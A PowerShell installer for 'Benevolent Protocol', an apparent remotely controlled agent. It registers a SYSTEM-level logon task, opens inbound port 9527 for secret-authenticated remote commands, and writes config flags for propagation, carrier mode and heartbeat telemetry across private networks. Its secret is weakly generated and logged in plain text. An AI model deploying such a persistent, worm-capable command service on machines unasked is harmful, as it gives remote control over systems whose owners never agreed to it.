# Benevolent Protocol - Windows Installation Script
# Run as Administrator
# Usage: .\install.ps1

param(
    [string]$InstallDir = "C:\Program Files\BenevolentProtocol",
    [string]$ConfigDir = "C:\ProgramData\BenevolentProtocol",
    [string]$LogFile = "C:\ProgramData\BenevolentProtocol\install.log",
    [switch]$Silent = $false
)

#Requires -RunAsAdministrator

# Version
$VERSION = "0.3.0-alpha"
$REPO_URL = "https://github.com/r0s-org/benevolent_protocol"
$RELEASE_URL = "https://github.com/r0s-org/benevolent_protocol/archive/refs/heads/main.zip"

# Colors (if not silent)
function Write-Status {
    param([string]$Message, [string]$Color = "Green")
    if (-not $Silent) {
        Write-Host $Message -ForegroundColor $Color
    }
}

function Write-ErrorMsg {
    param([string]$Message)
    if (-not $Silent) {
        Write-Host $Message -ForegroundColor Red
    }
}

function Write-WarningMsg {
    param([string]$Message)
    if (-not $Silent) {
        Write-Host $Message -ForegroundColor Yellow
    }
}

# Start logging
Start-Transcript -Path $LogFile -Force | Out-Null

Write-Status ""
Write-Status "=== Benevolent Protocol v$VERSION Installer ===" "Cyan"
Write-Status ""

# Check Windows version
$WindowsVersion = [System.Environment]::OSVersion.Version
if ($WindowsVersion.Major -lt 10) {
    Write-ErrorMsg "Windows 10 or later is required."
    Stop-Transcript | Out-Null
    exit 1
}
Write-Status "Windows $($WindowsVersion.Major).$($WindowsVersion.Minor) detected"

# Check Python
Write-Status ""
Write-Status "Checking Python installation..." "Yellow"

$PythonCmd = $null
$PythonVersion = $null

# Try python3 first
try {
    $PythonVersion = (python3 --version 2>&1) -replace "Python ", ""
    $PythonCmd = "python3"
}
catch {
    # Try python
    try {
        $PythonVersion = (python --version 2>&1) -replace "Python ", ""
        $PythonCmd = "python"
    }
    catch {
        Write-ErrorMsg "Python is not installed or not in PATH."
        Write-Status ""
        Write-WarningMsg "Please install Python 3.10+ from:"
        Write-WarningMsg "  https://www.python.org/downloads/"
        Write-Status ""
        Write-WarningMsg "Make sure to check 'Add Python to PATH' during installation."
        Stop-Transcript | Out-Null
        exit 1
    }
}

# Check version
$VersionParts = $PythonVersion.Split(".")
if ([int]$VersionParts[0] -lt 3 -or ([int]$VersionParts[0] -eq 3 -and [int]$VersionParts[1] -lt 10)) {
    Write-ErrorMsg "Python 3.10+ is required. Found: $PythonVersion"
    Stop-Transcript | Out-Null
    exit 1
}

Write-Status "Python $PythonVersion found ($PythonCmd)"

# Create directories
Write-Status ""
Write-Status "Creating directories..." "Yellow"

$Dirs = @($InstallDir, $ConfigDir, "$ConfigDir\logs", "$ConfigDir\data")
foreach ($Dir in $Dirs) {
    if (-not (Test-Path $Dir)) {
        New-Item -ItemType Directory -Path $Dir -Force | Out-Null
    }
}
Write-Status "Directories created"

# Download protocol
Write-Status ""
Write-Status "Downloading Benevolent Protocol..." "Yellow"

$ZipFile = "$env:TEMP\benevolent_protocol.zip"
$ExtractDir = "$env:TEMP\benevolent_protocol_extract"

try {
    # Clean up old downloads
    if (Test-Path $ZipFile) { Remove-Item $ZipFile -Force }
    if (Test-Path $ExtractDir) { Remove-Item $ExtractDir -Recurse -Force }

    # Download
    Invoke-WebRequest -Uri $RELEASE_URL -OutFile $ZipFile -UseBasicParsing

    # Extract
    Expand-Archive -Path $ZipFile -DestinationPath $ExtractDir -Force

    # Copy files (extracted folder has -main suffix)
    $SourceDir = Get-ChildItem "$ExtractDir\benevolent_protocol*" -Directory | Select-Object -First 1

    # Copy src, config, etc
    Copy-Item -Path "$SourceDir\src" -Destination "$InstallDir\src" -Recurse -Force
    Copy-Item -Path "$SourceDir\config" -Destination "$InstallDir\config" -Recurse -Force
    Copy-Item -Path "$SourceDir\requirements.txt" -Destination "$InstallDir\" -Force
    Copy-Item -Path "$SourceDir\LICENSE" -Destination "$InstallDir\" -Force -ErrorAction SilentlyContinue
    Copy-Item -Path "$SourceDir\README.md" -Destination "$InstallDir\" -Force -ErrorAction SilentlyContinue

    # Cleanup
    Remove-Item $ZipFile -Force
    Remove-Item $ExtractDir -Recurse -Force

    Write-Status "Protocol downloaded and extracted"
}
catch {
    Write-ErrorMsg "Failed to download: $_"
    Stop-Transcript | Out-Null
    exit 1
}

# Create virtual environment
Write-Status ""
Write-Status "Creating virtual environment..." "Yellow"

$VenvDir = "$InstallDir\venv"

try {
    & $PythonCmd -m venv $VenvDir
    Write-Status "Virtual environment created"
}
catch {
    Write-ErrorMsg "Failed to create virtual environment: $_"
    Stop-Transcript | Out-Null
    exit 1
}

# Install dependencies
Write-Status ""
Write-Status "Installing dependencies..." "Yellow"

$PipCmd = "$VenvDir\Scripts\pip.exe"

try {
    & $PipCmd install --upgrade pip | Out-Null
    & $PipCmd install -r "$InstallDir\requirements.txt" 2>&1 | Out-Null
    Write-Status "Dependencies installed"
}
catch {
    Write-WarningMsg "Some dependencies may have failed to install: $_"
}

# Generate secure secret
Write-Status ""
Write-Status "Generating secure configuration..." "Yellow"

$Secret = [Convert]::ToHexString((1..64 | ForEach-Object { Get-Random -Maximum 16 }))

# Create configuration
$ConfigFile = "$ConfigDir\config.json"

$Config = @{
    telemetry_enabled   = $true
    telemetry_level     = "standard"
    telemetry_endpoint  = $null
    heartbeat_interval  = 60
    command_port        = 9527
    optimization_interval = 3600
    propagation_enabled = $false
    gaming_mode_auto_detect = $true
    max_cpu_percent     = 30
    max_memory_mb       = 500
    control_secret      = $Secret
    update_endpoint     = $null
    log_level           = "INFO"
    log_file            = "$ConfigDir\logs\protocol.log"
    platform_mode       = "active"
    linux_carrier_mode  = $true
    windows_active_mode = $true
    android_active_mode = $true
    allowed_networks    = @("192.168.0.0/16", "10.0.0.0/8")
    excluded_hosts      = @()
}

$Config | ConvertTo-Json -Depth 10 | Out-File -FilePath $ConfigFile -Encoding UTF8

Write-Status "Configuration created"
Write-Status ""
Write-WarningMsg "  Configuration: $ConfigDir\config.json"
Write-WarningMsg "  Secret: $Secret"
Write-WarningMsg "  Save this secret for remote commands!"

# Create start script
Write-Status ""
Write-Status "Creating helper scripts..." "Yellow"

# Use Set-Content instead of here-strings to avoid parsing issues
$StartBat = "@echo off`ncd /d `"$InstallDir`"`ncall venv\Scripts\activate.bat`npython -m src.core.orchestrator --config `"$ConfigDir\config.json`"`npause"
Set-Content -Path "$InstallDir\start.bat" -Value $StartBat -Encoding ASCII

$StatusBat = "@echo off`necho Benevolent Protocol Status`necho ==========================`ntasklist /FI `"IMAGENAME eq python.exe`" 2>nul | find `"python.exe`" >nul`nif %ERRORLEVEL%==0 (`n    echo Status: Running`n) else (`n    echo Status: Stopped`n)`necho.`necho Config: $ConfigDir\config.json`necho Logs: $ConfigDir\logs\`npause"
Set-Content -Path "$InstallDir\status.bat" -Value $StatusBat -Encoding ASCII

$StopBat = "@echo off`necho Stopping Benevolent Protocol...`ntaskkill /F /IM `"pythonw.exe`" /FI `"WINDOWTITLE eq Benevolent*`" 2>nul`nif %ERRORLEVEL%==0 (`n    echo Protocol stopped.`n) else (`n    echo Protocol was not running.`n)`npause"
Set-Content -Path "$InstallDir\stop.bat" -Value $StopBat -Encoding ASCII

Write-Status "Helper scripts created"

# Create scheduled task for auto-start
Write-Status ""
Write-Status "Setting up scheduled task..." "Yellow"

$TaskName = "BenevolentProtocol"
$TaskExists = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue

if ($TaskExists) {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
}

$Action = New-ScheduledTaskAction `
    -Execute "$InstallDir\venv\Scripts\pythonw.exe" `
    -Argument "-m src.core.orchestrator --config `"$ConfigDir\config.json`"" `
    -WorkingDirectory $InstallDir

$Trigger = New-ScheduledTaskTrigger -AtLogon

$Settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable

$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask `
    -TaskName $TaskName `
    -Action $Action `
    -Trigger $Trigger `
    -Settings $Settings `
    -Principal $Principal `
    -Description "Benevolent Protocol - System optimization service" | Out-Null

Write-Status "Scheduled task created (starts at login)"

# Add firewall rule
Write-Status ""
Write-Status "Configuring firewall..." "Yellow"

$FirewallRule = Get-NetFirewallRule -DisplayName "Benevolent Protocol" -ErrorAction SilentlyContinue
if ($FirewallRule) {
    Remove-NetFirewallRule -DisplayName "Benevolent Protocol"
}

New-NetFirewallRule `
    -DisplayName "Benevolent Protocol" `
    -Direction Inbound `
    -LocalPort 9527 `
    -Protocol TCP `
    -Action Allow `
    -Profile Private | Out-Null

Write-Status "Firewall configured (port 9527)"

# Create desktop shortcut
Write-Status ""
Write-Status "Creating shortcuts..." "Yellow"

$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("$env:USERPROFILE\Desktop\Benevolent Protocol.lnk")
$Shortcut.TargetPath = "$InstallDir\start.bat"
$Shortcut.WorkingDirectory = $InstallDir
$Shortcut.Description = "Start Benevolent Protocol"
$Shortcut.Save()

Write-Status "Desktop shortcut created"

# Summary
Write-Status ""
Write-Status "=== Installation Complete ===" "Cyan"
Write-Status ""
Write-Status "Installation Directory: $InstallDir"
Write-Status "Configuration: $ConfigDir\config.json"
Write-Status "Logs: $ConfigDir\logs\"
Write-Status ""
Write-Status "Commands:"
Write-Status "  Start:   $InstallDir\start.bat"
Write-Status "  Stop:    $InstallDir\stop.bat"
Write-Status "  Status:  $InstallDir\status.bat"
Write-Status "  Task:    Start-ScheduledTask -TaskName BenevolentProtocol"
Write-Status ""
Write-WarningMsg "IMPORTANT: Edit $ConfigDir\config.json before starting!"
Write-WarningMsg "The protocol will start automatically at login."
Write-Status ""

# Start now?
if (-not $Silent) {
    $StartNow = Read-Host "Start Benevolent Protocol now? (Y/n)"
    if ($StartNow -ne "n" -and $StartNow -ne "N") {
        Start-ScheduledTask -TaskName $TaskName
        Write-Status "Protocol started!" "Green"
    }
}

Stop-Transcript | Out-Null

Write-Status ""
Write-Status "Installation log saved to: $LogFile"
Write-Status ""
Write-Status "Protocol installed successfully!" "Green"
